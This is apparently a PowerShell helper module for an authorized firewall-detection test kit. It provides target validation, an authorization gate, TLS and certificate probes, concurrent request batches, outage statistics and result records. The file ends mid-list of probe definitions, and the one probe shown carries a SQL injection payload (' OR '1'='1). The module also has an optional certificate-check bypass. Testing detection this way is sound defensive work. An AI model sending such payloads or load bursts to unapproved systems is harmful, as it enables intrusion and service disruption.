Set-StrictMode -Version Latest

# Capture the defining file while it is being dot-sourced. Function invocation
# metadata is not reliable inside fresh Windows PowerShell 5.1 runspaces.
$script:HelperScriptPath = $PSCommandPath
$script:SchemaVersion = '1.0'
$script:DefaultKitVersion = '1.0.0'

function Get-KitRoot {
    return (Split-Path -Parent $PSScriptRoot)
}

function Get-KitVersion {
    $versionPath = Join-Path (Get-KitRoot) 'VERSION.json'
    try {
        $version = Get-Content -LiteralPath $versionPath -Raw -ErrorAction Stop | ConvertFrom-Json -ErrorAction Stop
        return [string]$version.KitVersion
    }
    catch {
        return $script:DefaultKitVersion
    }
}

function Get-UtcTimestamp {
    param([datetime]$Value = [datetime]::UtcNow)
    return $Value.ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ss.fffZ', [Globalization.CultureInfo]::InvariantCulture)
}

function New-TestRunId {
    return ([guid]::NewGuid().ToString('N'))
}

function Get-NotApplicableReference {
    param([Parameter(Mandatory = $true)][string]$Reason)
    return ('N/A ' + [char]0x2014 + ' ' + $Reason)
}

function Assert-AuthorizedTesting {
    param(
        [Parameter(Mandatory = $true)][bool]$AuthorizationConfirmed,
        [Parameter(Mandatory = $true)][string]$TestCaseId
    )
    if (-not $AuthorizationConfirmed) {
        throw "$TestCaseId contains security-test payloads. Re-run only in an approved window with -ConfirmAuthorizedTesting."
    }
}

function Resolve-SafeTargetUri {
    param(
        [Parameter(Mandatory = $true)][string]$TargetUrl,
        [switch]$AllowHttp,
        [string]$ExpectedHost
    )

    $uri = $null
    if (-not [Uri]::TryCreate($TargetUrl, [UriKind]::Absolute, [ref]$uri)) {
        throw 'TargetUrl must be an absolute URL.'
    }
    if ($uri.Scheme -ne 'https' -and -not ($AllowHttp -and $uri.Scheme -eq 'http')) {
        throw 'TargetUrl must use HTTPS unless this test explicitly enables its direct-HTTP baseline.'
    }
    if (-not [string]::IsNullOrEmpty($uri.UserInfo)) {
        throw 'TargetUrl must not contain user information or credentials.'
    }
    if (-not [string]::IsNullOrEmpty($uri.Fragment)) {
        throw 'TargetUrl must not contain a fragment.'
    }
    if ([string]::IsNullOrWhiteSpace($uri.DnsSafeHost)) {
        throw 'TargetUrl must contain a host.'
    }
    if ($uri.DnsSafeHost.EndsWith('.example.invalid', [StringComparison]::OrdinalIgnoreCase)) {
        throw 'Replace the example.invalid placeholder with the approved customer target before running.'
    }
    if ($ExpectedHost -and $uri.DnsSafeHost -ne $ExpectedHost) {
        throw 'The requested URL host differs from the approved target host.'
    }
    return $uri
}

function Join-SafeTargetUri {
    param(
        [Parameter(Mandatory = $true)][Uri]$BaseUri,
        [Parameter(Mandatory = $true)][string]$Path,
        [switch]$AllowHttp
    )

    $candidate = $null
    if ([Uri]::TryCreate($Path, [UriKind]::Absolute, [ref]$candidate)) {
        if ($candidate.Scheme -ne $BaseUri.Scheme -or $candidate.DnsSafeHost -ne $BaseUri.DnsSafeHost -or $candidate.Port -ne $BaseUri.Port) {
            throw 'Absolute test paths must keep the exact approved scheme, host, and port.'
        }
    }
    else {
        $candidate = New-Object Uri($BaseUri, $Path)
    }
    if ($candidate.Scheme -ne 'https' -and -not ($AllowHttp -and $candidate.Scheme -eq 'http')) {
        throw 'The resulting test URL uses a scheme that is not permitted for this test.'
    }
    if ($candidate.DnsSafeHost -ne $BaseUri.DnsSafeHost -or $candidate.Port -ne $BaseUri.Port) {
        throw 'The resulting test URL leaves the approved target host or port.'
    }
    return $candidate
}

function Get-SanitizedTarget {
    param([Parameter(Mandatory = $true)][Uri]$Uri)
    $port = $Uri.Port
    $authority = $Uri.DnsSafeHost
    if (-not $Uri.IsDefaultPort) {
        $authority += ':' + $port
    }
    return [pscustomobject]@{
        TargetUrl    = $Uri.Scheme + '://' + $authority + $Uri.AbsolutePath
        TargetScheme = $Uri.Scheme
        TargetHost   = $Uri.DnsSafeHost
        TargetPort   = $port
        TargetPath   = $Uri.AbsolutePath
    }
}

function New-CorrelationId {
    param(
        [Parameter(Mandatory = $true)][string]$RunId,
        [Parameter(Mandatory = $true)][string]$TestCaseId,
        [Parameter(Mandatory = $true)][string]$ProbeId
    )
    $value = ('EB-{0}-{1}-{2}' -f $RunId.Substring(0, [Math]::Min(12, $RunId.Length)), $TestCaseId, $ProbeId)
    return ($value -replace '[^A-Za-z0-9._-]', '-')
}

function New-ResultDirectory {
    param(
        [Parameter(Mandatory = $true)][string]$RunId,
        [Parameter(Mandatory = $true)][string]$TestCaseId
    )
    $stamp = [datetime]::UtcNow.ToString('yyyyMMddTHHmmssfffZ', [Globalization.CultureInfo]::InvariantCulture)
    $safeRun = ($RunId -replace '[^A-Za-z0-9_-]', '-')
    $path = Join-Path (Join-Path (Get-KitRoot) 'results') ($stamp + '-' + $safeRun + '-' + $TestCaseId)
    $null = New-Item -ItemType Directory -Path $path -Force
    return $path
}

function Get-Sha256Text {
    param([Parameter(Mandatory = $true)][string]$Text)
    $sha = New-Object Security.Cryptography.SHA256Managed
    try {
        $bytes = [Text.Encoding]::UTF8.GetBytes($Text)
        return ([BitConverter]::ToString($sha.ComputeHash($bytes))).Replace('-', '').ToLowerInvariant()
    }
    finally {
        $sha.Dispose()
    }
}

function New-ResultRecord {
    param([hashtable]$Values = @{})

    $record = [ordered]@{
        SchemaVersion                 = $script:SchemaVersion
        KitVersion                    = Get-KitVersion
        RunId                         = $null
        CorrelationId                 = $null
        TestCaseId                    = $null
        TestName                      = $null
        CoverageCategory              = $null
        ProbeId                       = $null
        ProbeName                     = $null
        CveReference                  = $null
        Phase                         = $null
        StartTimeUtc                  = $null
        EndTimeUtc                    = $null
        DurationMs                    = $null
        PowerShellVersion             = $PSVersionTable.PSVersion.ToString()
        OsVersion                     = [Environment]::OSVersion.VersionString
        MachineName                   = [Environment]::MachineName
        AuthorizationConfirmed        = $false
        SkipCertificateCheck          = $false
        OperatorMarker                = $null
        ManualEvidenceRequired        = $true
        TargetUrl                     = $null
        TargetScheme                  = $null
        TargetHost                    = $null
        TargetPort                    = $null
        TargetPath                    = $null
        Method                        = $null
        StatusCode                    = $null
        TransportOutcome              = $null
        TlsProtocol                   = $null
        CipherSuite                   = $null
        CertificateSubject            = $null
        CertificateIssuer             = $null
        CertificateThumbprint         = $null
        CertificateSerialNumber       = $null
        CertificateNotBeforeUtc       = $null
        CertificateNotAfterUtc        = $null
        CertificateValidationSucceeded = $null
        RequestCount                  = 0
        SuccessCount                  = 0
        FailureCount                  = 0
        StatusDistribution            = [ordered]@{}
        LatencyP50Ms                  = $null
        LatencyP95Ms                  = $null
        LatencyP99Ms                  = $null
        ThroughputRequestsPerSecond   = $null
        WorstConsecutiveFailures      = 0
        WorstOutageStartUtc           = $null
        WorstOutageEndUtc             = $null
        WorstOutageDurationMs         = 0
        MaxInterSampleGapMs           = $null
        ExpectedOutcome               = $null
        ObservedOutcome               = $null
        Verdict                       = 'INCONCLUSIVE'
        ExpectedPaloSignatureIds      = @()
        ObservedPaloSignatureIds      = @()
        EvidenceFiles                 = @()
        ErrorCategory                 = $null
        ErrorMessage                  = $null
        Notes                         = $null
    }

    foreach ($key in $Values.Keys) {
        if (-not $record.Contains($key)) {
            throw "Unknown result field: $key"
        }
        $record[$key] = $Values[$key]
    }
    return [pscustomobject]$record
}

function Invoke-SafeHttpRequest {
    param(
        [Parameter(Mandatory = $true)][Uri]$TargetUri,
        [Parameter(Mandatory = $true)][string]$RunId,
        [Parameter(Mandatory = $true)][string]$TestCaseId,
        [Parameter(Mandatory = $true)][string]$ProbeId,
        [ValidateSet('GET', 'POST', 'HEAD')][string]$Method = 'GET',
        [hashtable]$Headers = @{},
        [byte[]]$Body,
        [string]$ContentType = 'application/octet-stream',
        [ValidateRange(1, 300)][int]$TimeoutSeconds = 10,
        [switch]$SkipCertificateCheck
    )

    $started = [datetime]::UtcNow
    $watch = [Diagnostics.Stopwatch]::StartNew()
    $statusCode = $null
    $transport = 'ERROR'
    $errorCategory = $null
    $errorMessage = $null
    $correlationId = New-CorrelationId -RunId $RunId -TestCaseId $TestCaseId -ProbeId $ProbeId
    $response = $null

    try {
        $request = [Net.HttpWebRequest]::Create($TargetUri)
        $request.Method = $Method
        $request.AllowAutoRedirect = $false
        $request.KeepAlive = $false
        $request.Timeout = $TimeoutSeconds * 1000
        $request.ReadWriteTimeout = $TimeoutSeconds * 1000
        $request.UserAgent = 'EasyBuy-Windows-Bastion-Test-Kit/1.0'
        $request.Headers['X-EasyBuy-Test-Run'] = $RunId
        $request.Headers['X-EasyBuy-Test-Case'] = $TestCaseId
        $request.Headers['X-EasyBuy-Test-Probe'] = $ProbeId
        $request.Headers['X-EasyBuy-Correlation-ID'] = $correlationId

        if ($SkipCertificateCheck) {
            # HttpWebRequest owns this callback; no process-global TLS callback is changed.
            # The delegate binds positionally, so the first parameter is deliberately not
            # named $sender, which is a PowerShell automatic variable.
            $request.ServerCertificateValidationCallback = { param($senderObject, $certificate, $chain, $errors) return $true }
        }

        foreach ($name in $Headers.Keys) {
            $value = [string]$Headers[$name]
            if ($name -ieq 'User-Agent') {
                $request.UserAgent = $value
            }
            elseif ($name -ieq 'Content-Type') {
                $request.ContentType = $value
            }
            else {
                $request.Headers[[string]$name] = $value
            }
        }

        if ($null -ne $Body -and $Body.Length -gt 0) {
            $request.ContentType = $ContentType
            $request.ContentLength = $Body.Length
            $stream = $request.GetRequestStream()
            try {
                $stream.Write($Body, 0, $Body.Length)
            }
            finally {
                $stream.Dispose()
            }
        }

        $response = [Net.HttpWebResponse]$request.GetResponse()
        $statusCode = [int]$response.StatusCode
        $transport = 'HTTP_RESPONSE'
    }
    catch [Net.WebException] {
        $errorCategory = [string]$_.Exception.Status
        $errorMessage = $_.Exception.Message
        if ($null -ne $_.Exception.Response) {
            $response = [Net.HttpWebResponse]$_.Exception.Response
            $statusCode = [int]$response.StatusCode
            $transport = 'HTTP_ERROR_RESPONSE'
        }
        else {
            $transport = 'TRANSPORT_ERROR'
        }
    }
    catch {
        $errorCategory = $_.Exception.GetType().FullName
        $errorMessage = $_.Exception.Message
        $transport = 'CLIENT_ERROR'
    }
    finally {
        if ($null -ne $response) {
            $response.Close()
        }
        $watch.Stop()
    }

    $success = $null -ne $statusCode -and $statusCode -ge 200 -and $statusCode -lt 400
    return [pscustomobject]@{
        TimestampUtc    = Get-UtcTimestamp $started
        EndTimeUtc      = Get-UtcTimestamp
        CorrelationId   = $correlationId
        StatusCode      = $statusCode
        TransportOutcome = $transport
        LatencyMs       = [Math]::Round($watch.Elapsed.TotalMilliseconds, 3)
        Success         = $success
        ErrorCategory   = $errorCategory
        ErrorMessage    = $errorMessage
    }
}

function Get-TlsProbe {
    param(
        [Parameter(Mandatory = $true)][Uri]$TargetUri,
        [ValidateRange(1, 300)][int]$TimeoutSeconds = 10,
        [switch]$SkipCertificateCheck,
        [switch]$RequestTls13
    )

    $started = [datetime]::UtcNow
    $watch = [Diagnostics.Stopwatch]::StartNew()
    $tcp = $null
    $ssl = $null
    # A hashtable gives the validation callback shared mutable state under
    # Windows PowerShell 5.1 closure semantics.
    $validationState = @{ CertificateErrors = [Net.Security.SslPolicyErrors]::None }
    $capability = $true
    $errorCategory = $null
    $errorMessage = $null
    $cert = $null

    try {
        if ($RequestTls13 -and -not ([Enum]::GetNames([Security.Authentication.SslProtocols]) -contains 'Tls13')) {
            $capability = $false
            throw 'This PowerShell/.NET runtime cannot explicitly request TLS 1.3.'
        }
        $tcp = New-Object Net.Sockets.TcpClient
        $connect = $tcp.BeginConnect($TargetUri.DnsSafeHost, $TargetUri.Port, $null, $null)
        if (-not $connect.AsyncWaitHandle.WaitOne($TimeoutSeconds * 1000)) {
            throw 'TLS TCP connection timed out.'
        }
        $tcp.EndConnect($connect)
        # RemoteCertificateValidationCallback binds positionally. The first parameter is
        # deliberately not named $sender, which is a PowerShell automatic variable.
        $callback = {
            param($senderObject, $remoteCertificate, $chain, $sslPolicyErrors)
            $validationState.CertificateErrors = $sslPolicyErrors
            if ($SkipCertificateCheck) { return $true }
            return $sslPolicyErrors -eq [Net.Security.SslPolicyErrors]::None
        }.GetNewClosure()
        $validationCallback = [Net.Security.RemoteCertificateValidationCallback]$callback
        $ssl = New-Object Net.Security.SslStream($tcp.GetStream(), $false, $validationCallback)
        $ssl.ReadTimeout = $TimeoutSeconds * 1000
        $ssl.WriteTimeout = $TimeoutSeconds * 1000
        if ($RequestTls13) {
            $tls13 = [Enum]::Parse([Security.Authentication.SslProtocols], 'Tls13')
            $ssl.AuthenticateAsClient($TargetUri.DnsSafeHost, $null, $tls13, $false)
        }
        else {
            $ssl.AuthenticateAsClient($TargetUri.DnsSafeHost)
        }
        if ($null -ne $ssl.RemoteCertificate) {
            $cert = New-Object Security.Cryptography.X509Certificates.X509Certificate2($ssl.RemoteCertificate)
        }
        $cipher = [string]$ssl.CipherAlgorithm + '-' + [string]$ssl.CipherStrength
        if ($ssl.PSObject.Properties.Name -contains 'NegotiatedCipherSuite') {
            $cipher = [string]$ssl.NegotiatedCipherSuite
        }
        return [pscustomobject]@{
            TimestampUtc                  = Get-UtcTimestamp $started
            Success                       = $true
            CapabilityAvailable           = $capability
            TlsProtocol                   = [string]$ssl.SslProtocol
            CipherSuite                   = $cipher
            CertificateSubject            = if ($cert) { $cert.Subject } else { $null }
            CertificateIssuer             = if ($cert) { $cert.Issuer } else { $null }
            CertificateThumbprint         = if ($cert) { $cert.Thumbprint } else { $null }
            CertificateSerialNumber       = if ($cert) { $cert.SerialNumber } else { $null }
            CertificateNotBeforeUtc        = if ($cert) { Get-UtcTimestamp $cert.NotBefore } else { $null }
            CertificateNotAfterUtc         = if ($cert) { Get-UtcTimestamp $cert.NotAfter } else { $null }
            CertificateValidationSucceeded = [bool](-not $SkipCertificateCheck -and $validationState.CertificateErrors -eq [Net.Security.SslPolicyErrors]::None)
            LatencyMs                     = [Math]::Round($watch.Elapsed.TotalMilliseconds, 3)
            ErrorCategory                 = $null
            ErrorMessage                  = $null
        }
    }
    catch {
        $errorCategory = $_.Exception.GetType().FullName
        $errorMessage = $_.Exception.Message
        return [pscustomobject]@{
            TimestampUtc                  = Get-UtcTimestamp $started
            Success                       = $false
            CapabilityAvailable           = $capability
            TlsProtocol                   = $null
            CipherSuite                   = $null
            CertificateSubject            = $null
            CertificateIssuer             = $null
            CertificateThumbprint         = $null
            CertificateSerialNumber       = $null
            CertificateNotBeforeUtc        = $null
            CertificateNotAfterUtc         = $null
            CertificateValidationSucceeded = $false
            LatencyMs                     = [Math]::Round($watch.Elapsed.TotalMilliseconds, 3)
            ErrorCategory                 = $errorCategory
            ErrorMessage                  = $errorMessage
        }
    }
    finally {
        $watch.Stop()
        if ($cert) { $cert.Dispose() }
        if ($ssl) { $ssl.Dispose() }
        if ($tcp) { $tcp.Close() }
    }
}

function Get-CurlTls13Capability {
    $command = Get-Command 'curl.exe' -CommandType Application -ErrorAction SilentlyContinue
    if (-not $command) {
        return [pscustomobject]@{ Available=$false; CommandPath=$null; Reason='curl.exe was not found.'; Version=$null }
    }

    $versionOutput = @(& $command.Source '--version' 2>&1)
    $versionExit = $LASTEXITCODE
    $helpOutput = @(& $command.Source '--help' 'all' 2>&1)
    $helpExit = $LASTEXITCODE
    $helpText = $helpOutput -join "`n"
    if ($versionExit -ne 0 -or $helpExit -ne 0 -or $helpText -notmatch '(?m)--tlsv1\.3\b' -or $helpText -notmatch '(?m)--tls-max\b') {
        return [pscustomobject]@{
            Available=$false
            CommandPath=$command.Source
            Reason='curl.exe does not advertise both --tlsv1.3 and --tls-max support.'
            Version=($versionOutput -join ' ')
        }
    }
    return [pscustomobject]@{
        Available=$true
        CommandPath=$command.Source
        Reason=$null
        Version=($versionOutput -join ' ')
    }
}

function Get-NearestRankPercentile {
    param(
        [double[]]$Values,
        [ValidateRange(0.01, 1.0)][double]$Percentile
    )
    if ($null -eq $Values -or $Values.Count -eq 0) { return $null }
    $sorted = @($Values | Sort-Object)
    $rank = [Math]::Ceiling($Percentile * $sorted.Count)
    return [Math]::Round([double]$sorted[[Math]::Max(0, $rank - 1)], 3)
}

function New-SampleRecord {
    param(
        [Parameter(Mandatory = $true)][int]$Sequence,
        [Parameter(Mandatory = $true)][object]$HttpResult,
        [Parameter(Mandatory = $true)][Uri]$TargetUri,
        [Parameter(Mandatory = $true)][string]$RunId,
        [Parameter(Mandatory = $true)][string]$TestCaseId,
        [Parameter(Mandatory = $true)][string]$ProbeId,
        [string]$Phase,
        [string]$OperatorMarker,
        [object]$TlsResult
    )
    $target = Get-SanitizedTarget $TargetUri
    return [pscustomobject][ordered]@{
        Sequence                  = $Sequence
        TimestampUtc              = $HttpResult.TimestampUtc
        RunId                     = $RunId
        CorrelationId             = $HttpResult.CorrelationId
        TestCaseId                = $TestCaseId
        ProbeId                   = $ProbeId
        Phase                     = $Phase
        TargetScheme              = $target.TargetScheme
        TargetHost                = $target.TargetHost
        TargetPort                = $target.TargetPort
        TargetPath                = $target.TargetPath
        StatusCode                = $HttpResult.StatusCode
        TransportOutcome          = $HttpResult.TransportOutcome
        LatencyMs                 = $HttpResult.LatencyMs
        TlsProtocol               = if ($TlsResult) { $TlsResult.TlsProtocol } else { $null }
        CertificateThumbprint     = if ($TlsResult) { $TlsResult.CertificateThumbprint } else { $null }
        CertificateSerialNumber   = if ($TlsResult) { $TlsResult.CertificateSerialNumber } else { $null }
        CertificateNotBeforeUtc   = if ($TlsResult) { $TlsResult.CertificateNotBeforeUtc } else { $null }
        CertificateNotAfterUtc    = if ($TlsResult) { $TlsResult.CertificateNotAfterUtc } else { $null }
        CertificateValidationSucceeded = if ($TlsResult) { $TlsResult.CertificateValidationSucceeded } else { $null }
        Success                   = [bool]$HttpResult.Success
        ErrorCategory             = $HttpResult.ErrorCategory
        ErrorMessage              = $HttpResult.ErrorMessage
        OperatorMarker            = $OperatorMarker
    }
}

function Get-RequestStatistics {
    param([object[]]$Samples)
    $items = @($Samples)
    $latencies = @($items | ForEach-Object { [double]$_.LatencyMs })
    $successCount = @($items | Where-Object { $_.Success }).Count
    $distribution = [ordered]@{}
    foreach ($group in @($items | Group-Object { if ($null -eq $_.StatusCode) { 'NO_STATUS' } else { [string]$_.StatusCode } })) {
        $distribution[$group.Name] = $group.Count
    }
    $throughput = $null
    if ($items.Count -gt 0) {
        $start = [datetime]::Parse($items[0].TimestampUtc).ToUniversalTime()
        $end = $start
        foreach ($item in $items) {
            $candidate = [datetime]::Parse($item.TimestampUtc).ToUniversalTime().AddMilliseconds([double]$item.LatencyMs)
            if ($candidate -gt $end) { $end = $candidate }
        }
        $seconds = [Math]::Max(0.001, ($end - $start).TotalSeconds)
        $throughput = [Math]::Round($items.Count / $seconds, 3)
    }
    return [pscustomobject]@{
        RequestCount                = $items.Count
        SuccessCount                = $successCount
        FailureCount                = $items.Count - $successCount
        StatusDistribution          = $distribution
        LatencyP50Ms                = Get-NearestRankPercentile -Values $latencies -Percentile 0.50
        LatencyP95Ms                = Get-NearestRankPercentile -Values $latencies -Percentile 0.95
        LatencyP99Ms                = Get-NearestRankPercentile -Values $latencies -Percentile 0.99
        ThroughputRequestsPerSecond = $throughput
    }
}

function Invoke-RequestBatch {
    param(
        [Parameter(Mandatory = $true)][Uri]$TargetUri,
        [Parameter(Mandatory = $true)][string]$RunId,
        [Parameter(Mandatory = $true)][string]$TestCaseId,
        [Parameter(Mandatory = $true)][string]$ProbeId,
        [ValidateRange(1, 1000000)][int]$SampleCount = 1,
        [ValidateRange(0, 86400)][int]$DurationSeconds = 0,
        [ValidateRange(1, 100)][int]$Concurrency = 1,
        [ValidateRange(1, 300)][int]$TimeoutSeconds = 10,
        [string]$Phase,
        [switch]$SkipCertificateCheck
    )

    $pool = [RunspaceFactory]::CreateRunspacePool(1, $Concurrency)
    $pool.Open()
    $workers = New-Object Collections.ArrayList
    $samples = New-Object Collections.ArrayList
    $helperPath = $script:HelperScriptPath
    $workerScript = @'
param($HelperPath, $TargetText, $RunId, $TestCaseId, $ProbeId, $TimeoutSeconds, $SkipCertificateCheck)
. $HelperPath
Invoke-SafeHttpRequest -TargetUri ([Uri]$TargetText) -RunId $RunId -TestCaseId $TestCaseId -ProbeId $ProbeId -TimeoutSeconds $TimeoutSeconds -SkipCertificateCheck:$SkipCertificateCheck
'@
    $deadline = if ($DurationSeconds -gt 0) { [datetime]::UtcNow.AddSeconds($DurationSeconds) } else { $null }
    $nextSequence = 1

    try {
        while (($DurationSeconds -gt 0 -and [datetime]::UtcNow -lt $deadline) -or ($DurationSeconds -eq 0 -and $nextSequence -le $SampleCount) -or $workers.Count -gt 0) {
            $maySchedule = ($DurationSeconds -gt 0 -and [datetime]::UtcNow -lt $deadline) -or ($DurationSeconds -eq 0 -and $nextSequence -le $SampleCount)
            while ($maySchedule -and $workers.Count -lt $Concurrency) {
                $ps = [PowerShell]::Create()
                $ps.RunspacePool = $pool
                $null = $ps.AddScript($workerScript).AddArgument($helperPath).AddArgument($TargetUri.AbsoluteUri).AddArgument($RunId).AddArgument($TestCaseId).AddArgument($ProbeId).AddArgument($TimeoutSeconds).AddArgument([bool]$SkipCertificateCheck)
                $handle = $ps.BeginInvoke()
                $null = $workers.Add([pscustomobject]@{ PowerShell = $ps; Handle = $handle; Sequence = $nextSequence })
                $nextSequence++
                $maySchedule = ($DurationSeconds -gt 0 -and [datetime]::UtcNow -lt $deadline) -or ($DurationSeconds -eq 0 -and $nextSequence -le $SampleCount)
            }

            $completed = @($workers | Where-Object { $_.Handle.IsCompleted })
            foreach ($worker in $completed) {
                $output = @($worker.PowerShell.EndInvoke($worker.Handle))
                if ($output.Count -gt 0) {
                    $null = $samples.Add((New-SampleRecord -Sequence $worker.Sequence -HttpResult $output[-1] -TargetUri $TargetUri -RunId $RunId -TestCaseId $TestCaseId -ProbeId $ProbeId -Phase $Phase))
                }
                $worker.PowerShell.Dispose()
                $null = $workers.Remove($worker)
            }
            if ($completed.Count -eq 0) { Start-Sleep -Milliseconds 10 }
        }
    }
    finally {
        foreach ($worker in @($workers)) {
            # Best-effort cancellation only: a worker that already completed or faulted
            # throws here, and cleanup must never mask the measured run result.
            try { $worker.PowerShell.Stop() } catch { }
            $worker.PowerShell.Dispose()
        }
        $pool.Close()
        $pool.Dispose()
    }
    return @($samples | Sort-Object Sequence)
}

function Write-EventMarker {
    param(
        [Parameter(Mandatory = $true)][string]$MarkerFile,
        [Parameter(Mandatory = $true)][ValidateLength(1, 80)][string]$Label
    )
    $safeLabel = ($Label -replace '[\r\n|]', ' ').Trim()
    $line = (Get-UtcTimestamp) + '|' + $safeLabel
    Add-Content -LiteralPath $MarkerFile -Value $line -Encoding ASCII
    return $line
}

function Invoke-RequestMonitor {
    param(
        [Parameter(Mandatory = $true)][Uri]$TargetUri,
        [Parameter(Mandatory = $true)][string]$RunId,
        [Parameter(Mandatory = $true)][string]$TestCaseId,
        [Parameter(Mandatory = $true)][string]$ProbeId,
        [ValidateRange(1, 86400)][int]$DurationSeconds,
        [ValidateRange(100, 60000)][int]$CadenceMilliseconds,
        [ValidateRange(1, 300)][int]$TimeoutSeconds,
        [Parameter(Mandatory = $true)][string]$MarkerFile,
        [ValidateRange(1, 100)][int]$MaxConcurrency = 8,
        [switch]$IncludeTlsProbe,
        [switch]$SkipCertificateCheck
    )

    if (-not (Test-Path -LiteralPath $MarkerFile)) {
        $null = New-Item -ItemType File -Path $MarkerFile -Force
    }
    $pool = [RunspaceFactory]::CreateRunspacePool(1, $MaxConcurrency)
    $pool.Open()
    $workers = New-Object Collections.ArrayList
    $samples = New-Object Collections.ArrayList
    $markers = New-Object Collections.ArrayList
    $helperPath = $script:HelperScriptPath
    $workerScript = @'
param($HelperPath, $TargetText, $RunId, $TestCaseId, $ProbeId, $TimeoutSeconds, $SkipCertificateCheck, $IncludeTlsProbe)
. $HelperPath
$uri = [Uri]$TargetText
$tls = $null
if ($IncludeTlsProbe) {
    $tls = Get-TlsProbe -TargetUri $uri -TimeoutSeconds $TimeoutSeconds -SkipCertificateCheck:$SkipCertificateCheck
}
$http = Invoke-SafeHttpRequest -TargetUri $uri -RunId $RunId -TestCaseId $TestCaseId -ProbeId $ProbeId -TimeoutSeconds $TimeoutSeconds -SkipCertificateCheck:$SkipCertificateCheck
[pscustomobject]@{ Http = $http; Tls = $tls }
'@
    $started = [datetime]::UtcNow
    $deadline = $started.AddSeconds($DurationSeconds)
    $nextDue = $started
    $sequence = 1
    $markerLineCount = 0
    $currentMarker = $null
    $keyMarkerCount = 0

    try {
        while ([datetime]::UtcNow -lt $deadline -or $workers.Count -gt 0) {
            if ([datetime]::UtcNow -lt $deadline -and [datetime]::UtcNow -ge $nextDue -and $workers.Count -lt $MaxConcurrency) {
                $ps = [PowerShell]::Create()
                $ps.RunspacePool = $pool
                $null = $ps.AddScript($workerScript).AddArgument($helperPath).AddArgument($TargetUri.AbsoluteUri).AddArgument($RunId).AddArgument($TestCaseId).AddArgument($ProbeId).AddArgument($TimeoutSeconds).AddArgument([bool]$SkipCertificateCheck).AddArgument([bool]$IncludeTlsProbe)
                $handle = $ps.BeginInvoke()
                $null = $workers.Add([pscustomobject]@{ PowerShell = $ps; Handle = $handle; Sequence = $sequence; Marker = $currentMarker })
                $sequence++
                $nextDue = $nextDue.AddMilliseconds($CadenceMilliseconds)
                if ($nextDue -lt [datetime]::UtcNow.AddMilliseconds(-$CadenceMilliseconds)) {
                    $nextDue = [datetime]::UtcNow
                }
            }

            # Optional convenience input only. A redirected, remote, or non-interactive
            # host throws on KeyAvailable/ReadKey; the monitor must keep sampling, and
            # the operator can still write markers from the printed marker-file command.
            try {
                if ([Environment]::UserInteractive -and [Console]::KeyAvailable) {
                    $key = [Console]::ReadKey($true)
                    if ($key.Key -eq [ConsoleKey]::M -or $key.Key -eq [ConsoleKey]::Enter) {
                        $keyMarkerCount++
                        $label = 'KEY-MARKER-' + $keyMarkerCount
                        $null = Write-EventMarker -MarkerFile $MarkerFile -Label $label
                    }
                }
            }
            catch { }

            $lines = @(Get-Content -LiteralPath $MarkerFile -ErrorAction SilentlyContinue)
            while ($markerLineCount -lt $lines.Count) {
                $parts = $lines[$markerLineCount] -split '\|', 2
                if ($parts.Count -eq 2) {
                    $marker = [pscustomobject]@{ TimestampUtc = $parts[0]; Label = $parts[1] }
                    $null = $markers.Add($marker)
                    $currentMarker = $marker.Label
                }
                $markerLineCount++
            }

            $completed = @($workers | Where-Object { $_.Handle.IsCompleted })
            foreach ($worker in $completed) {
                $output = @($worker.PowerShell.EndInvoke($worker.Handle))
                if ($output.Count -gt 0) {
                    $bundle = $output[-1]
                    $null = $samples.Add((New-SampleRecord -Sequence $worker.Sequence -HttpResult $bundle.Http -TlsResult $bundle.Tls -TargetUri $TargetUri -RunId $RunId -TestCaseId $TestCaseId -ProbeId $ProbeId -OperatorMarker $worker.Marker))
                }
                $worker.PowerShell.Dispose()
                $null = $workers.Remove($worker)
            }
            Start-Sleep -Milliseconds 10
        }
    }
    finally {
        foreach ($worker in @($workers)) {
            # Best-effort cancellation only: a worker that already completed or faulted
            # throws here, and cleanup must never mask the measured run result.
            try { $worker.PowerShell.Stop() } catch { }
            $worker.PowerShell.Dispose()
        }
        $pool.Close()
        $pool.Dispose()
    }

    return [pscustomobject]@{
        Samples = @($samples | Sort-Object Sequence)
        Markers = @($markers)
    }
}

function Get-OutageStatistics {
    param([object[]]$Samples)
    $items = @($Samples | Sort-Object Sequence)
    $worstCount = 0
    $currentCount = 0
    $currentStart = $null
    $worstStart = $null
    $worstEnd = $null
    $worstDuration = 0.0
    $maxGap = 0.0
    $previousTime = $null

    foreach ($item in $items) {
        $time = [datetime]::Parse($item.TimestampUtc).ToUniversalTime()
        if ($previousTime) {
            $gap = ($time - $previousTime).TotalMilliseconds
            if ($gap -gt $maxGap) { $maxGap = $gap }
        }
        $previousTime = $time
        if (-not $item.Success) {
            if ($currentCount -eq 0) { $currentStart = $time }
            $currentCount++
            if ($currentCount -gt $worstCount) { $worstCount = $currentCount }
        }
        elseif ($currentCount -gt 0) {
            $duration = ($time - $currentStart).TotalMilliseconds
            if ($duration -gt $worstDuration) {
                $worstDuration = $duration
                $worstStart = $currentStart
                $worstEnd = $time
            }
            $currentCount = 0
            $currentStart = $null
        }
    }
    if ($currentCount -gt 0 -and $items.Count -gt 0) {
        $last = $items[-1]
        $end = [datetime]::Parse($last.TimestampUtc).ToUniversalTime().AddMilliseconds([double]$last.LatencyMs)
        $duration = ($end - $currentStart).TotalMilliseconds
        if ($duration -gt $worstDuration) {
            $worstDuration = $duration
            $worstStart = $currentStart
            $worstEnd = $end
        }
    }
    return [pscustomobject]@{
        WorstConsecutiveFailures = $worstCount
        WorstOutageStartUtc      = if ($worstStart) { Get-UtcTimestamp $worstStart } else { $null }
        WorstOutageEndUtc        = if ($worstEnd) { Get-UtcTimestamp $worstEnd } else { $null }
        WorstOutageDurationMs    = [Math]::Round($worstDuration, 3)
        MaxInterSampleGapMs      = [Math]::Round($maxGap, 3)
    }
}

function Get-SafeSecurityProbeDefinitions {
    param([Parameter(Mandatory = $true)][string]$MarkerId)
    $safeMarker = ($MarkerId -replace '[^A-Za-z0-9-]', '-').ToLowerInvariant()
    $naGeneric = Get-NotApplicableReference 'generic detection probe; no product/version-specific CVE targeted'
    $naTool = Get-NotApplicableReference 'tool/signature detection; no vulnerable product/version targeted'
    return @(
        [pscustomobject]@{ ProbeId='SQLI-BOOLEAN'; ProbeName='SQL injection boolean syntax'; Method='GET'; Path="/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&marker=$safeMarker"; Headers=@{}; Body=$null; ContentType=$null; CveReference=$naGeneric; ExpectedPaloSignatureIds=@('36248') },
